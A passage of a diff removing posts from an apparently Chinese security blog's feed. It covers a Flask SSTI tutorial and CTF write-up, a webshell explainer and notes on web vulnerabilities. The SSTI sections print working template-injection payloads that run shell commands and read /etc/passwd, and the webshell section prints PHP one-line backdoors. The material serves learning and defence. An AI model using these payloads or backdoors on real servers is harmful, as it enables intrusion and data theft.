-&lt;h3&gt;%s&lt;/h3&gt;
-'''%(code)
-return render_template_string(html)
-</code></pre>
-<p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的code是用户可控的，会和html拼接后直接带入渲染。</p>
-<p>尝试构造code为一串js代码。<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622774927945.png" alt="" loading="lazy"><br>
-将代码改为如下</p>
-<pre><code>@app.route('/test/')
-def test():
-code = request.args.get('id')
-return render_template_string('&lt;h1&gt;{{ code }}&lt;/h1&gt;',code=code)
-</code></pre>
-<p>继续尝试<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622774932382.png" alt="" loading="lazy"><br>
-可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。<br>
-Flask模板注入</p>
-<p>解析：</p>
-<p>众所周知ssti要被<code>{{}}</code>包括。接下来的代码均要包括在ssti中。</p>
-<p>1.几种常用于ssti的魔术方法</p>
-<p><strong>class</strong>  返回类型所属的对象<br>
-<strong>mro</strong>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br>
-<strong>base</strong>   返回该对象所继承的基类<br>
-// __base__和__mro__都是用来寻找基类的</p>
-<p><strong>subclasses</strong>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>
-<strong>init</strong>  类的初始化方法<br>
-<strong>globals</strong>  对包含函数全局变量的字典的引用<br>
-<strong>builtins</strong> builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块</p>
-<p>2.获取基类的几种方法</p>
-<pre><code>[].__class__.__base__
-''.__class__.__mro__[2]
-().__class__.__base__
-{}.__class__.__base__
-request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
-或者
-[].__class__.__bases__[0]       //其他的类似
-</code></pre>
-<p>3.获取基本类的子类<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622774939374.png" alt="" loading="lazy"><br>
-ssti的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件的类）加以利用。</p>
-<p>那么我们可以利用的类有哪些呢？</p>
-<p>4.利用</p>
-<p>我们可以利用的方法有<code>&lt;type 'file'&gt;</code>等。（甚至file一般是第40号）</p>
-<pre><code>().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
-</code></pre>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1622774944103.png" alt="" loading="lazy"><br>
-可以从上面的例子中看到我们用file读取了 /etc/passwd ，但是如果想要读取目录怎么办？</p>
-<p>那么我们可以寻找万能的os模块。</p>
-<p>写脚本遍历。<br>
-复制代码</p>
-<pre><code>#!/usr/bin/env python
-# encoding: utf-8
-
-num = 0
-
-for item in ''.__class__.__mro__[2].__subclasses__():
-try:
-if 'os' in item.__init__.__globals__:
-print num,item
-num+=1
-except:
-print '-'
-num+=1
-</code></pre>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1622774949520.png" alt="" loading="lazy"><br>
-直接调用就好了。可以直接调用system函数，有了shell其他的问题不就解决了吗？</p>
-<pre><code>().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
-</code></pre>
-<p>5.读写文件</p>
-<p>当然，某些情况下system函数会被过滤。这时候也可以采用os模块的listdir函数来读取目录。(可以配合file来实现任意文件读取)</p>
-<pre><code>().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')  #读取本级目录
-</code></pre>
-<p>另外在某些不得已的情况下可以使用以下方式来读取文件。（没见过这种情况）。</p>
-<p>方法一：</p>
-<pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()　　　　#把 read() 改为 write() 就是写文件
-</code></pre>
-<p>方法二：</p>
-<p>存在的子模块可以通过 .index()方式来查询</p>
-<pre><code>''.__class__.__mro__[2].__subclasses__().index(file)
-40
-</code></pre>
-<p>用file模块来查询。</p>
-<pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
-</code></pre>
-<p>这里拿 xctf 中的 Web_python_template_injection 做例子</p>
-<p>进入题目界面可以看到<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622774955812.png" alt="" loading="lazy"><br>
-尝试模板注入      <code>{{7*7}}</code></p>
-<p>/49的存在说明这条指令被忠实地执行了。接下来，开始想办法编代码拿到服务器的控制台权限 首先，题目告诉我们这是一个python注入问题，那么脚本肯定也是python的，思考怎样用python语句获取控制台权限：想到了os.system和os.popen(<a href="https://blog.csdn.net/sxingming/article/details/52071514">参考资料</a>),这两句前者返回<strong>退出状态码</strong>,后者<strong>以file形式</strong>返回<strong>输出内容</strong>,我们想要的是内容，所所以选择os.popen<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622774960628.png" alt="" loading="lazy"><br>
-知道了要用这一句，那么我要怎么找到这一句呢？python给我们提供了完整的寻找链(参考资料)<br>
-class：返回对象所属的类<br>
-mro：返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。<br>
-base：返回该类所继承的基类 //base__和__mro__都是用来寻找基类的__subclasses：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>
-init：类的初始化方法<br>
-globals：对包含函数全局变量的字典的引用<br>
-首先，找到当前变量所在的类：</p>
-<p>有回显。尝试模板注入。</p>
-<p>构造payload：</p>
-<pre><code>{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1622774966196.png" alt="" loading="lazy"></figure>
-<p>读目录发现了fl4g。直接用file读取。构造payload:</p>
-<pre><code>{{[].__class__.__base__.__subclasses__()[40]('fl4g').read()}}
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1622774971627.png" alt="" loading="lazy"></figure>
-<p>拿到了flag。<br>
-##注意事项：<br>
-复制代码</p>
-<pre><code>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('catfl4g').read()
-
-
-''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
-
-
-''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
-</code></pre>
-<p>复制代码</p>
-<p>以上payload是非常常用的payload</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[web安全相关知识点]]></title>
-        <id>https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/</id>
-        <link href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">
-        </link>
-        <updated>2021-05-30T06:31:54.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="http-请求头各参数具体含义">HTTP 请求头各参数具体含义</h1>
-<p>Header	解释	示例<br>
-Accept	指定客户端能够接收的内容类型	Accept: text/plain, text/html<br>
-Accept-Charset	浏览器可以接受的字符编码集。	Accept-Charset: iso-8859-5<br>
-Accept-Encoding	指定浏览器可以支持的web服务器返回内容压缩编码类型。	Accept-Encoding: compress, gzip<br>
-Accept-Language	浏览器可接受的语言	Accept-Language: en,zh<br>
-Accept-Ranges	可以请求网页实体的一个或者多个子范围字段	Accept-Ranges: bytes<br>
-Authorization	HTTP授权的授权证书	Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==<br>
-Cache-Control	指定请求和响应遵循的缓存机制	Cache-Control: no-cache<br>
-Connection	表示是否需要持久连接。（HTTP 1.1默认进行持久连接）	Connection: close<br>
-Cookie	HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。	Cookie: $Version=1; Skin=new;<br>
-Content-Length	请求的内容长度	Content-Length: 348<br>
-Content-Type	请求的与实体对应的MIME信息	Content-Type: application/x-www-form-urlencoded<br>
-Date	请求发送的日期和时间	Date: Tue, 15 Nov 2010 08:12:31 GMT<br>
-Expect	请求的特定的服务器行为	Expect: 100-continue<br>
-From	发出请求的用户的Email	From: user@email.com<br>
-Host	指定请求的服务器的域名和端口号	Host: www.zcmhi.com<br>
-If-Match	只有请求内容与实体相匹配才有效	If-Match: “737060cd8c284d8af7ad3082f209582d”<br>
-If-Modified-Since	如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码	If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT<br>
-If-None-Match	如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变	If-None-Match: “737060cd8c284d8af7ad3082f209582d”<br>
-If-Range	如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag	If-Range: “737060cd8c284d8af7ad3082f209582d”<br>
-If-Unmodified-Since	只在实体在指定时间之后未被修改才请求成功	If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT<br>
-Max-Forwards	限制信息通过代理和网关传送的时间	Max-Forwards: 10<br>
-Pragma	用来包含实现特定的指令	Pragma: no-cache<br>
-Proxy-Authorization	连接到代理的授权证书	Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==<br>
-Range	只请求实体的一部分，指定范围	Range: bytes=500-999<br>
-Referer	先前网页的地址，当前请求网页紧随其后,即来路	Referer: http://www.zcmhi.com/archives/71.html<br>
-TE	客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息	TE: trailers,deflate;q=0.5<br>
-Upgrade	向服务器指定某种传输协议以便服务器进行转换（如果支持）	Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11<br>
-User-Agent	User-Agent的内容包含发出请求的用户信息	User-Agent: Mozilla/5.0 (Linux; X11)<br>
-Via	通知中间网关或代理服务器地址，通信协议	Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)<br>
-Warning	关于消息实体的警告信息	Warn: 199 Miscellaneous warning</p>
-<h1 id="responses-部分-http-header">Responses 部分 | Http Header</h1>
-<p>Header	解释	示例<br>
-Accept-Ranges	表明服务器是否支持指定范围请求及哪种类型的分段请求	Accept-Ranges: bytes<br>
-Age	从原始服务器到代理缓存形成的估算时间（以秒计，非负）	Age: 12<br>
-Allow	对某网络资源的有效的请求行为，不允许则返回405	Allow: GET, HEAD<br>
-Cache-Control	告诉所有的缓存机制是否可以缓存及哪种类型	Cache-Control: no-cache<br>
-Content-Encoding	web服务器支持的返回内容压缩编码类型。	Content-Encoding: gzip<br>
-Content-Language	响应体的语言	Content-Language: en,zh<br>
-Content-Length	响应体的长度	Content-Length: 348<br>
-Content-Location	请求资源可替代的备用的另一地址	Content-Location: /index.htm<br>
-Content-MD5	返回资源的MD5校验值	Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==<br>
-Content-Range	在整个返回体中本部分的字节位置	Content-Range: bytes 21010-47021/47022<br>
-Content-Type	返回内容的MIME类型	Content-Type: text/html; charset=utf-8<br>
-Date	原始服务器消息发出的时间	Date: Tue, 15 Nov 2010 08:12:31 GMT<br>
-ETag	请求变量的实体标签的当前值	ETag: “737060cd8c284d8af7ad3082f209582d”<br>
-Expires	响应过期的日期和时间	Expires: Thu, 01 Dec 2010 16:00:00 GMT<br>
-Last-Modified	请求资源的最后修改时间	Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT<br>
-Location	用来重定向接收方到非请求URL的位置来完成请求或标识新的资源	Location: http://www.zcmhi.com/archives/94.html<br>
-Pragma	包括实现特定的指令，它可应用到响应链上的任何接收方	Pragma: no-cache<br>
-Proxy-Authenticate	它指出认证方案和可应用到代理的该URL上的参数	Proxy-Authenticate: Basic<br>
-refresh	应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）	Refresh: 5; url=http://www.atool.org/httptest.php<br>
-Retry-After	如果实体暂时不可取，通知客户端在指定时间之后再次尝试	Retry-After: 120<br>
-Server	web服务器软件名称	Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)<br>
-Set-Cookie	设置Http Cookie	Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1<br>
-Trailer	指出头域在分块传输编码的尾部存在	Trailer: Max-Forwards<br>
-Transfer-Encoding	文件传输编码	Transfer-Encoding:chunked<br>
-Vary	告诉下游代理是使用缓存响应还是从原始服务器请求	Vary: *<br>
-Via	告知代理客户端响应是通过哪里发送的	Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)<br>
-Warning	警告实体可能存在的问题	Warning: 199 Miscellaneous warning<br>
-WWW-Authenticate	表明客户端请求实体应该使用的授权方案	WWW-Authenticate: Basic<br>
-X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>
-————————————————<br>
-版权声明：本文为CSDN博主「xiaochengyihe」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
-原文链接：https://blog.csdn.net/xiaochengyihe/article/details/80910913</p>
-<h1 id="一文详解webshell">一文详解Webshell</h1>
-<p>Webshell是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除web页面、修改主页等，其危害不言而喻。黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>
-<p>常见的webshell编写语言为asp、jsp和php。本文将以php Webshell为示例，详细解释Webshell的常用函数、工作方式以及常用隐藏技术。</p>
-<p>一、Webshell为何备受黑客青睐<br>
-黑客使用Webshell的第一步通常是将其上传到可以访问的服务器中，例如利用用户CMS系统的第三方插件中的漏洞上传一个简单的php Webshell。当然，Webshell类型和作用也不完全相同，一些简单的Webshell只起到连接外界的作用，允许黑客插入更加精准的恶意脚本，执行他们所需要的指令；另外一些则可能更加复杂，带有数据库或文件浏览器，让黑客能够从数千英里之外的地方查看入侵系统的代码和数据。无论何种设计，Webshell都极其危险，是网络罪犯和高级持续威胁(APTs)的常用工具。Webshell常见的攻击特点主要有以下几点：</p>
-<p>持久化远程访问</p>
-<p>Webshell脚本通常会包含后门，黑客上传Webshell之后，就可以充分利用Webshell的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完Webshell之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p>
-<p>提权</p>
-<p>在服务器没有配置错误的情况下，Webshell将在web服务器的用户权限下运行，而用户权限是有限的。通过Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得Root权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p>
-<p>隐蔽性极强</p>
-<p>Webshell可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制的服务器或远程主机交互的数据都是通过80端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell使用post包发送，也不会被记录在系统日志中，只会在Web日志中记录一些数据提交的记录。</p>
-<p>二、Webshell常用的PHP函数<br>
-Webshell几乎适用于所有Web编程语言。之所以关注PHP，是因为它是web上使用最广泛的编程语言。下面是PHP中一些执行shell命令最常用的函数。</p>
-<p>system() exec() shell_exec() shell_exec() proc_open() 倒引号</p>
-<p>很多PHP开发人员并没有意识到这一点，但是PHP会首先执行shell命令中倒引号（<code>）内的内容。请注意，倒引号（</code>）和单引号（’）不同。</p>
-<p>三、黑客如何隐藏Webshell<br>
-修改报头</p>
-<p>黑客使用用户代理字符串而不是通过$_POST 请求参数来传递命令的。</p>
-<pre><code>&lt;?php system($_SERVER['HTTP_USER_AGENT']);?&gt;
-</code></pre>
-<p>然后，黑客可以通过将命令放在User-Agent HTTP报头中来制作特定的HTTP请求。<br>
-在服务器日志中可以看到这一行为的效果，其中第二个请求中的HTTP User-Agent被cat /etc/passwd命令替换了。<br>
-上述方法会产生很大噪声，可以很容易地提示管理员查看服务器日志。但采用下列方法，管理员这很难发现。</p>
-<pre><code>&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']);?&gt;
-</code></pre>
-<p>这种方法没有留下关于执行命令的任何可见轨迹（至少在访问日志中是这样）。</p>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1622358978210.png" alt="" loading="lazy"><br>
-注意：黑客通常会在函数前使用@运算符，以防发生任何错误，写入错误日志。<br>
-混淆</p>
-<p>黑客使用各种混淆技术，以避免被管理员检测到。他们不断提出新的更复杂的方法来隐藏其代码并绕过安全系统。下面是我们看到的一些最常用的技术。</p>
-<p>（1）删除空格换行符</p>
-<p>通过从代码块中删除空格换行符，代码看起来像一个大字符串，这就使得代码的可读性降低并且更难识别脚本要实现什么目的。<br>
-（2）加密技术</p>
-<p>该技术可以对代码进行加密，降低代码的可读性，并且充分利用运行时可以重建代码的各种函数。<br>
-(3）使用Hex进行混淆</p>
-<p>ASCII字符的十六进制值也可以用于进一步混淆Webshell命令，下面的例子可以很好地说明混淆技术在Webshell中的应用。<br>
-（4）通过可控输入实现混淆</p>
-<p>PHP常用的可控输入包括: $_GET, $_POST, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>R</mi></msub><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">_REQUEST,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span></span></span></span>_FILES,$_SERVER $_COOKIE等，是PHP预定义的变量，可以将黑客自定义的值传递给浏览器中。</p>
-<p>以下示例很简单，但很实用。虽然未对代码进行编码或加密，但由于它没有使用任何可疑的函数名（例如eval()或assert()）、冗长的编码字符串、复杂的代码，因此与之前的代码相比，可检测性仍然较低。最重要的是，当管理员查看日志时，它不会引起任何危险。<br>
-预防</p>
-<p>通常，黑客会利用Web服务器软件中存在的漏洞来安装Webshell。因此，消除这些漏洞对于避免失陷Web服务器的潜在风险很重要。以下是一些与Webshell相关的预防措施。</p>
-<p>如果不使用，要禁用危险的PHP函数，例如exec()、shell_exec()、passthru()、system()、show_source()、proc_open()、pcntl_exec()、eval()与assert()。</p>
-<p>如果必须要启用这些命令，请确保未授权用户无法访问这些脚本。此外，使用escapeshellarg()和escapeshellcmd()可以确保不能将用户输入注入到shell命令中，从而导致命令执行漏洞。</p>
-<p>如果Web应用程序正在使用上传表单，请确保上传的表单是安全的，并且仅允许上传白名单所允许的文件类型。</p>
-<p>不要相信用户输入的信息。</p>
-<p>不要盲目使用在线论坛或网站上的代码。</p>
-<p>对于WordPress，如果不需要，要避免安装第三方插件。如果需要使用插件，请确保插接件其信誉良好且经常更新。</p>
-<p>在敏感目录（如图片或上传）中禁用PHP执行。</p>
-<p>锁定Web服务器用户权限。</p>
-<p>上面给出的是一些简单的Webshell检测和预防措施。面对较为复杂的Webshell攻击，则需要采用一些专业的Webshell检测工具来实现了。</p>
-<p>六、总结<br>
-Webshell编码简单，使用方便，但由于许多Web服务器的设置方式问题，即使是一个简单的脚本也足以造成严重的破坏。这就是为什么有成千上万的公开Webshell的原因所在。Webshell存在如此多的变种，导致入侵检测和入侵防御系统（IDS/IPS）很难检测到它们，尤其是当使用签名来检测此类Webshell时。有些Webshell非常复杂，即使进行行为分析，也几乎无法检测到。</p>
-<p>话虽如此，但Webshell只是漏洞利用后的实施工具，这就意味着首先要尽早检测出Webshell，防止其上传后进行漏洞利用。<br>
-参考网址：https://www.freebuf.com/articles/web/235651.html</p>
-<p>你听说过“ 0day漏洞 ”吗？这个词让人联想到世界末日的景像，其中的技术要么达到了出神入化甚至疯狂的状态，要么又回到了CRT显示器和绿屏时代。</p>
-<p>说实话，0day没有那么不祥的征兆。但是就是非常严重。实际上，在所有已知的漏洞中，0day通常是能够造成最大的风险。这是为什么？原因在于定义。</p>
-<p>什么是0day漏洞？<br>
-0day漏洞是指负责应用程序的程序员或供应商所未知的软件缺陷。因为该漏洞未知，所以没有可用的补丁程序。</p>
-<p>换句话说，该漏洞是由不直接参与项目的人员发现的。术语“0day”是指从发现漏洞到对其进行首次攻击之间的天数。0day漏洞公开后，便称为nday漏洞。</p>
-<p>0day时间表的工作原理如下：</p>
-<p>一个人或一个公司创建了一个软件，其中包含一个漏洞，但涉及编程或发行的人员却不知道。<br>
-在开发人员有机会定位或解决问题之前，有人（除负责软件的人员之外）发现了漏洞。<br>
-发现该漏洞的人会创建恶意代码来利用该漏洞。<br>
-该漏洞被释放。<br>
-负责人员将被告知漏洞利用并打补丁。<br>
-该漏洞不再被视为0day。<br>
-补丁发布。<br>
-大多数情况下，针对0day漏洞的攻击很少立即被发现。发现这些缺陷通常可能需要几天或几个月的时间，这才使这类漏洞如此危险。</p>
-<p>如何处理0day漏洞？<br>
-作为管理员或用户，可能无能为力。最好的情况是永远不要使用未打补丁版本的软件。这在 Linux 社区中通常很常见，在 Linux 社区中，许多用户不会安装.0发行版。相反，他们将等待.1版本（例如Ubuntu 19.10.1）。通过避免最初发布的版本，可能会免受第一批产品中至少任何未发现的0day漏洞的影响。这并不意味着.1版本将修补所有的0day漏洞。如果有的话，甚至在下一个主要版本之前，它们都可能未被发现。经常在新闻中看到存在一段时间的软件中发现的新漏洞。</p>
-<p>作为开发人员，最好的办法是招募尽可能多的版本测试人员。这是开源软件比专有软件更具优势的地方。在源代码公开的情况下，任何人都可以审查和测试代码。而且，Beta开源软件通常面向公众发布，因此任何人都可以进行测试。另一方面，付费软件通常不会向公众发布Beta（当然，也有例外）。当应用程序的beta测试人员数量有限时，发现的bug较少，从而导致0day漏洞的可能性更高。</p>
-<p>因此，最终用户应该推迟采用全新的发行版本，而开发人员需要先进行测试、测试和测试，然后再发布给公众。</p>
-<p>最后，你可以做的一件事就是确保将错误报告提交给开发人员和公司。错误报告是程序员解决软件问题的一种有效方法。而且，你永远都不会知道，你提交的BUG很可能导致0day漏洞的发现和后续修补。</p>
-<p>01 注入漏洞<br>
-1）SQL注入（SQL Injection）<br>
-由于程序对SQL相关的一些敏感字符缺少过滤or转换，攻击者把SQL命令插入到用户提交的数据中，欺骗服务器执行恶意的SQL命令，非法获取到内部权限和数据。<br>
-风险：读取or篡改数据库的数据，获取服务器or管理员权限<br>
-类型：<br>
-a.数据型<br>
-b.字符型<br>
-其他注入方式<br>
-c.伪静态注入<br>
-d.GET &amp; POST注入<br>
-e.Cookie注入</p>
-<p>2）SQL盲注（SQL Blind Injection）<br>
-a.基于布尔的盲注<br>
-SQL注入过程中，应用程序仅仅返回True页面和False页面，无法根据应用程序的返回页面得到数据库信息，但可通过构造逻辑条件（如比较大小）向服务端请求后的返回页面来分析判断我们所需要的数据库信息。<br>
-b.基于时间的盲注<br>
-注入的SQL代码影响后台数据库的功能，但此时Web的前端页面始终显示True页面，知识页面返回的响应时间有差异，可以根据时间差来推断注入语句中的判断条件真假，继而获取数据库相关的信息。</p>
-<p>3）OS命令注入<br>
-OS Command Injection，当应用程序使用外部输入的字符串，or使用受外部影响的字符串来组装命令时，若没有进行安全过滤防范，可能产生OS命令的注入攻击，甚至操作服务器相关的权限。</p>
-<p>4）Xpath注入<br>
-利用XPath解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath查询代码，以获得权限信息的访问权并更改这些信息。</p>
-<p>......</p>
-<p>02 失效的身份认证和会话管理<br>
-用户身份认证和会话管理是一个应用程序中最关键的过程，有缺陷的设计会严重破坏这个过程。在开发Web应用程序时，开发人员往往只关注Web应用程序所需的功能，通常会建立自定义的认证和会话管理方案。但要正确实现这些方案却很难，结果这些自定义的方案往往在如下方面存在漏洞：退出、密码管理、超时、记住我、密码问题、帐户更新等。</p>
-<p>03 敏感信息泄露<br>
-在最近几年，这是最常见的、最具影响力的攻击。这个领域最常见的漏洞是不对敏感信息进行加密。在数据加密过程中，常见的问题是不安全的密钥生成和管理以及使用弱加密算法、弱协议和弱密码。特别是使用弱的哈希算法来保护密码。<br>
-攻击者不是直接攻击密码，而是在传输过程中或从客户端（例如：浏览器）窃取密钥、发起中间人攻击，或从服务器端窃取明文数据。</p>
-<p>04 XML外部实体（XXE）<br>
-默认情况下，许多旧的XML处理器能够对外部实体、XML进程中被引用和评估的URI进行规范。如果攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。<br>
-XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p>
-<p>05 失效的访问控制<br>
-由于缺乏自动化的检测和应用程序开发人员缺乏有效的功能测试，因而访问控制缺陷很常见。访问控制检测通常不适用于自动化的静态或动态测试。手动测试是检测访问控制缺失或失效的最佳方法，包括：HTTP方法（如：GET和PUT）、控制器、直接对象引用。<br>
-攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。</p>
-<p>06 安全配置错误<br>
-安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务、平台、Web服务器、应用服务器、数据库、框架、自定义代码和预安装的虚拟机、容器和存储。自动扫描器可用于检测错误的安全配置、默认帐户的使用或配置、不必要的服务、遗留选项等。<br>
-通常，攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</p>
-<p>07 跨站脚本（XSS）<br>
-XSS是OWASP Top10中第二普遍的安全问题，存在于近三分之二的应用中。由于程序缺少对某些敏感字符的过滤or转换，攻击者对在url或输入框中输入HTML/JS恶意代码提交成功后并被执行，获取用户or程序敏感信息。<br>
-XSS对于反射和DOM的影响是中等的，而对于存储的XSS，XSS的影响更为严重，譬如在受攻击者的浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。</p>
-<p>08 不安全的反序列化<br>
-反序列化漏洞有十年的历史，存在于不同的编程语言中，最为明显的当属Java、PHP、Python、Ruby。漏洞的本质就是反序列化机制打破了数据和对象的边界，导致攻击者注入的恶意序列化数据在反序列化过程中被还原成对象，控制了对象就可能在目标系统上面执行攻击代码。</p>
-<p>09 使用含有已知漏洞的组件<br>
-这种安全漏洞普遍存在。基于组件开发的模式使得多数开发团队不了解其应用或API中使用的组件，更谈不上及时更新这些组件了。如Retire.js之类的扫描器可以帮助发现此类漏洞，但这类漏洞是否可以被利用还需花费额外的时间去研究。</p>
-<p>10 不足的日志记录和监控<br>
-对不足的日志记录及监控的利用几乎是每一个重大安全事件的温床。攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。<br>
-根据行业调查的结果，此问题被列入了Top10。判断你是否有足够监控的一个策略是在渗透测试后检查日志。测试者的活动应被充分的记录下来，能够反映出他们造成了什么样的影响。<br>
-多数成功的攻击往往从漏洞探测开始。允许这种探测会将攻击成功的可能性提高到近100%；据统计，在2016年确定一起数据泄露事件平均需要花191天时间，这么长时间里损害早已发生。</p>
-<p>11 跨站请求伪造（CSRF）<br>
-CSRF是利用某些web应用程序允许攻击者预测一个特定操作的所有细节。由于浏览器自动发送会话cookie等认证凭证，攻击者能创建恶意web页面产生伪造请求。这些伪造请求很难与合法请求区分开。<br>
-攻击者能欺骗受害用户完成该受害者所允许的任意状态改变的操作，比如：更新帐号细节，完成购物，注销甚至登录等操作。</p>
-<p>12 未验证的重定向和转发<br>
-应用程序经常将用户重定向到其他网页，或以类似的方式进行内部转发。有时，目标网页是通过一个未经验证的参数来指定的，这就允许攻击者选择目标页面。<br>
-攻击者链接到未验证的重定向并诱使受害者去点击。由于是链接到有效的网站，受害者很有可能去点击。攻击者利用不安全的转发绕过安全检测。<br>
-这种重定向可能试图安装恶意软件或者诱使受害者泄露密码或其他敏感信息。不安全的转发可能允许绕过访问控制。</p>
-<p>12 弱口令漏洞<br>
-弱口令(weak password) ，没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令，如：生日、名字、简单的顺序数字or字符。</p>
-<p>13 文件上传漏洞<br>
-文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。<br>
-WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p>
-<p>14 缓冲区溢出<br>
